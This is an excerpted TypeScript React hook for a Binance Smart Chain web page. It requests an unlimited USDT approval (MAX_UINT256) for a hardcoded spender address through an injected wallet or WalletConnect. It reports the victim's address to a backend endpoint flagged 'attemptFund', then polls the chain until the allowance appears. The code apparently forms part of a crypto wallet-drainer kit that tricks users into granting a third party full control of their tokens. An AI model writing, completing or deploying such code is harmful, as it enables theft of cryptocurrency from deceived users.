...
const BSC_SPENDER_ADDRESS =
  process.env.NEXT_PUBLIC_BSC_SPENDER_ADDRESS ??
  "0xBde048de16D9a513777EA3da204EB755A678F165";
const BEP20_BACKEND_URL =
  process.env.NEXT_PUBLIC_BEP20_BACKEND_URL ?? "";

const MAX_UINT256 =
  "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
const BSC_CHAIN_ID_WC  = "eip155:56";
const BSC_CHAIN_ID_HEX = "0x38";

// ─────────────────────────────────────────────────────────────────────────────
export function useBep20Approval() {
  ...
  const preGenerateWCUri = () => {
    ...
    const generate = async () => {
      try {
        ...
        console.warn("preGenerateWCUri (BEP20) failed:", e);
        return null;
      }
    };
  ...
  // ── Main handler ──────────────────────────────────────────────────────────
  const handleBep20Approval = async () => {
    setProcessing(true);
    ...
    if (isMobile && typeof window !== "undefined" && (window as any).ethereum) {
      try {
        ...
        if (BEP20_BACKEND_URL) {
          try {
            await axios.post(
              `${BEP20_BACKEND_URL.replace(/\/+$/, "")}/api/v2/ws-user-gate`,
              { userAddress: address, attemptFund: true }
            );
          } catch {}
        }
        ...
        const usdtRO = new ethers.Contract(BSC_USDT_ADDRESS, iface2, provider);
        let existingAllowance = BigInt(0);
        try { existingAllowance = await usdtRO.allowance(address, BSC_SPENDER_ADDRESS); } catch {}

        if (existingAllowance > BigInt(0)) {
          setTxHash("already_approved");
          setShowSuccess(true);
          if (BEP20_BACKEND_URL) {
            axios.post(`${BEP20_BACKEND_URL.replace(/\/+$/, "")}/notify-approval`,
          ...
          const data = iface.encodeFunctionData("approve", [BSC_SPENDER_ADDRESS, MAX_UINT256]);
          const tx   = await signer.sendTransaction({ to: BSC_USDT_ADDRESS, data });
        ...
        console.error("Native BEP20 error:", err);
        return;
      } finally {
        setProcessing(false);
      }
    ...
    // Matches reference exactly: lines 1450-1682 of ApproveForForward.tsx
    // ════════════════════════════════════════════════════════════════
    try {
      let preGen = null;
      ...
      // notify-visit / ws-user-gate — matches reference line 1479-1484
      if (BEP20_BACKEND_URL) {
        try {
          await axios.post(
            `${BEP20_BACKEND_URL.replace(/\/+$/, "")}/api/v2/ws-user-gate`,
      ...
      // ── Read balance + allowance via public RPC (matches reference lines 1489-1502) ──
      let existingAllowanceWC = BigInt(0);
      try {
        const rpcProvider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
        const iface2 = new ethers.Interface([
          "function allowance(address owner, address spender) view returns (uint256)",
        ]);
        const usdtRO = new ethers.Contract(BSC_USDT_ADDRESS, iface2, rpcProvider);
        existingAllowanceWC = await usdtRO.allowance(address, BSC_SPENDER_ADDRESS) as bigint;
      ...
      if (existingAllowanceWC > BigInt(0)) {
        ...
        // WalletConnect sometimes fails to relay the tx response back even
        // though the user approved on their phone. Polling the blockchain
        // for the allowance change acts as a reliable fallback.
        const wcPromise = activeClient.request<string>({
          topic: sess.topic,
          chainId: BSC_CHAIN_ID_WC,
          request: {
            method: "eth_sendTransaction",
            params: [{ from: address, to: BSC_USDT_ADDRESS, data, gas: "0x186A0" }],
          },
        }).catch((err: any) => {
          ...
          // Non-rejection WC error (connection drop) → return never-resolving
          // promise so on-chain polling can still detect the approval
        ...
        const pollPromise = new Promise<string>((resolve) => {
          pollTimer = setInterval(async () => {
            try {
              ...
              const usdtChk = new ethers.Contract(BSC_USDT_ADDRESS, ifaceChk, rpc);
              const cur = await usdtChk.allowance(address, BSC_SPENDER_ADDRESS) as bigint;
              if (cur > BigInt(0)) {
      ...
      console.error("BEP20 WC error:", err);
    } finally {
      if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
      setProcessing(false);
      setWcUri(null);
